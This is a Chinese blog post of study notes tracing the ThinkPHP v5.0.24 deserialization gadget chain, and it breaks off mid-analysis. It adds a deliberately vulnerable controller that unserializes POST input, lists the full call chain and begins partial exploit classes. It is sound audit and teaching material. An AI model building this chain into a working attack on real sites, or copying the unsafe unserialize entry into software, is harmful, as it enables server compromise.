<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ThinkPHPv5.0.24反序列化 | ♥ Seizer</title><meta name="keywords" content="反序列化,ThinkPHP"><meta name="author" content="Seizer"><meta name="copyright" content="Seizer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ThinkPHP v5.0.24 反序列化前言昨天花了一下午的时间才把反序列化链给审明白，今天记录一下笔记再来审一遍。（自己还是太菜了~~~） 在我的印象中，ThinkPHP框架的漏洞非常多，所以也是学习代码审计的优选，提升代码能力，从每一天做起！ 在这一次的审计中，因为没有使用动态调试，所以使用的是vscode进行审计，如果需要动态调试，我将会使用到PHPStorm。使用vscode的原因有：1">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHPv5.0.24反序列化">
<meta property="og:url" content="https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/index.html">
<meta property="og:site_name" content="♥ Seizer">
<meta property="og:description" content="ThinkPHP v5.0.24 反序列化前言昨天花了一下午的时间才把反序列化链给审明白，今天记录一下笔记再来审一遍。（自己还是太菜了~~~） 在我的印象中，ThinkPHP框架的漏洞非常多，所以也是学习代码审计的优选，提升代码能力，从每一天做起！ 在这一次的审计中，因为没有使用动态调试，所以使用的是vscode进行审计，如果需要动态调试，我将会使用到PHPStorm。使用vscode的原因有：1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/cover.png">
<meta property="article:published_time" content="2022-08-31T16:00:00.000Z">
<meta property="article:modified_time" content="2022-09-01T08:07:28.059Z">
<meta property="article:author" content="Seizer">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="ThinkPHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/cover.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://seizer.top/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ThinkPHPv5.0.24反序列化',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-01 16:07:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><script src="https://libs.baidu.com/jquery/1.8.3/jquery.js"></script><script src="https://libs.baidu.com/jquery/1.8.3/jquery.min.js"> </script><script src="/js/snow.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css">
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading();" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="wizard-scene"><div class="wizard-objects"><div class="wizard-square"></div><div class="wizard-circle"></div><div class="wizard-triangle"></div></div><div class="wizard"><div class="wizard-body"></div><div class="wizard-right-arm"><div class="wizard-right-hand"></div></div><div class="wizard-left-arm"><div class="wizard-left-hand"></div></div><div class="wizard-head"><div class="wizard-beard"></div><div class="wizard-face"><div class="wizard-adds"></div></div><div class="wizard-hat"><div class="wizard-hat-of-the-hat"></div><div class="wizard-four-point-star --first"></div><div class="wizard-four-point-star --second"></div><div class="wizard-four-point-star --third"></div></div></div></div></div></div></a><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">♥ Seizer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div><div id="navFn"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">ThinkPHPv5.0.24反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2022-08-31T16:00:00.000Z" title="undefined 2022-09-01 00:00:00">2022-09-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHPv5.0.24反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="ThinkPHP-v5-0-24-反序列化"><a href="#ThinkPHP-v5-0-24-反序列化" class="headerlink" title="ThinkPHP v5.0.24 反序列化"></a>ThinkPHP v5.0.24 反序列化</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天花了一下午的时间才把反序列化链给审明白，今天记录一下笔记再来审一遍。（自己还是太菜了~~~）</p>
<p>在我的印象中，ThinkPHP框架的漏洞非常多，所以也是学习代码审计的优选，提升代码能力，从每一天做起！</p>
<p>在这一次的审计中，因为没有使用动态调试，所以使用的是vscode进行审计，如果需要动态调试，我将会使用到PHPStorm。使用vscode的原因有：1. 具有语法高亮 2.可以进行定义跳转 3.可以进行全局文件及内容搜索，在分析的过程中我会逐一体现以上优点。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>ThinkPHP这里提供两种环境搭建的方法</p>
<ol>
<li>从Github中下载源码</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/think">https://github.com/top-think/think</a></p>
<p>再Releases中找到V5.0.24并下载</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled.png" alt="Untitled"></p>
<p>之后在目录下通过composer去更新源码</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>通过composer直接下载源码</li>
</ol>
<p>直接使用composer去创建一个v5.0.24的ThinkPHP项目</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 5.0.24</span><br></pre></td></tr></tbody></table></figure>

<p>源码下载完成之后，因为并不存在反序列化入口，所以需要我们手动添加</p>
<p>在<code>application\index\controller\Index.php</code>中加入一个新的方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$payload</span> = <span class="variable">$_POST</span>[<span class="string">'payload'</span>];</span><br><span class="line">    @unserialize(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>上下文如图：</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%201.png" alt="Untitled"></p>
<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>先把反序列化链调用过程写出来：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">File.php:<span class="number">160</span>, think\cache\driver\File-&gt;set()</span><br><span class="line">Memcache.php:<span class="number">94</span>, think\session\driver\Memcache-&gt;write()</span><br><span class="line">Output.php:<span class="number">154</span>, think\console\Output-&gt;write()</span><br><span class="line">Output.php:<span class="number">143</span>, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:<span class="number">124</span>, think\console\Output-&gt;block()</span><br><span class="line">Output.php:<span class="number">212</span>, call_user_func_array()</span><br><span class="line">Output.php:<span class="number">212</span>, think\console\Output-&gt;__call()</span><br><span class="line">Model.php:<span class="number">912</span>, think\console\Output-&gt;getAttr()</span><br><span class="line">Model.php:<span class="number">912</span>, think\Model-&gt;toArray()</span><br><span class="line">Model.php:<span class="number">936</span>, think\Model-&gt;toJson()</span><br><span class="line">Model.php:<span class="number">2267</span>, think\Model-&gt;__toString()</span><br><span class="line">Windows.php:<span class="number">163</span>, file_exists()</span><br><span class="line">Windows.php:<span class="number">163</span>, think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line">Windows.php:<span class="number">59</span>, think\process\pipes\Windows-&gt;__destruct()</span><br><span class="line">Index.php:<span class="number">14</span>, app\index\controller\Index-&gt;hello()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Windows-php入口"><a href="#Windows-php入口" class="headerlink" title="Windows.php入口"></a>Windows.php入口</h2><p>前人栽树，后人乘凉，我们直接找到反序列化链的入口文件，从该类的<code>__destruct</code>方法开始寻找</p>
<p>使用<code>Ctrl+P</code>快速搜索文件</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%202.png" alt="Untitled"></p>
<p>使用<code>Ctrl+F</code>进行搜索定位关键字</p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%203.png" alt="Untitled"></p>
<p>接着按住<code>Ctrl</code>然后<code>左键</code>点击<code>removeFiles</code>直接跳转到<code>removeFiles</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) {</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) {</span><br><span class="line">            @unlink(<span class="variable">$filename</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>跟随可控点<code>$this→files</code>发现<code>file_exists</code>函数可以触发<code>__toString</code>方法</p>
<p>使用<code>Ctrl+Shift+F</code>进行全局搜索<code>function __toString</code></p>
<p><img src="/images/loading.gif" data-original="/post/2022-09/ThinkPHP%20v5%200%2024%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%200918176c2d57466cb7300ed0d2759829/Untitled%204.png" alt="Untitled"></p>
<p>通过查看我们发现除了<code>Input.php</code>和<code>Expression.php</code>都是可以去接着触发<code>__call</code>方法的，这里我们选择大佬们选择的<code>Model.php</code></p>
<p><code>Model.php</code>中定义了一个抽象类<code>Model</code>，所以我们需要找到一个它的子类进行定义，这里我们只需要全局搜索<code>extends Model</code>，这里找到了<code>Merge</code>和<code>Pivot</code>，都可以使用，这里选择<code>Pivot</code></p>
<p>每结束一部分，我们去编写每一部分的exp，否则最后还得重头再找一遍</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Model-php过渡"><a href="#Model-php过渡" class="headerlink" title="Model.php过渡"></a>Model.php过渡</h2><p>跳转至该类的<code>__toString</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>继续跳转至<code>toJson</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), <span class="variable">$options</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>继续跳转至<code>toArray</code>方法</p>
<p>我们看到了有很多的代码，这是审计过程中的第一道难关，我们先去大概的看一下每条代码，尝试去寻找<strong>可控参数</strong>并且尝试进行<strong>下一次跳转</strong></p>
<p>直到进入887行的<code>if</code>语句才有了可控参数跳转<code>__call</code>方法的机会</p>
<p>这里找到了3个利用点：</p>
<ol>
<li>892行的<code>$relation</code>可控</li>
<li>896行的<code>$relation</code>可控</li>
<li>912行的<code>$value</code>可控</li>
</ol>
<p>前两者的用法是一样的，最后一种难度较高，但这三个都可以成功利用，这里我们用第3种难度较高的</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) {</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) {</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) {</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray();</span><br><span class="line">        } <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">'.'</span>)) {</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">'.'</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) {</span><br><span class="line">                <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">'getBindAttr'</span>)) {</span><br><span class="line">                    <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) {</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) {</span><br><span class="line">                            <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) {</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">'bind attr has exists:'</span> . <span class="variable">$key</span>);</span><br><span class="line">                            } <span class="keyword">else</span> {</span><br><span class="line">                                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>首先我们要保证<code>$this→append</code>数组不为空，其次在遍历数组时，要进入第三个else语句中，需要满足</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_array(<span class="variable">$name</span>)    <span class="comment">// 值不为数组</span></span><br><span class="line">strpos(<span class="variable">$name</span>, <span class="string">'.'</span>) <span class="comment">// 值中不含.</span></span><br></pre></td></tr></tbody></table></figure>

<p>之后进入了<code>Loader::parseName</code>方法</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span>) {</span><br><span class="line">        <span class="variable">$name</span> = preg_replace_callback(<span class="string">'/_([a-zA-Z])/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$match</span></span>) </span>{</span><br><span class="line">            <span class="keyword">return</span> strtoupper(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">        }, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? ucfirst(<span class="variable">$name</span>) : lcfirst(<span 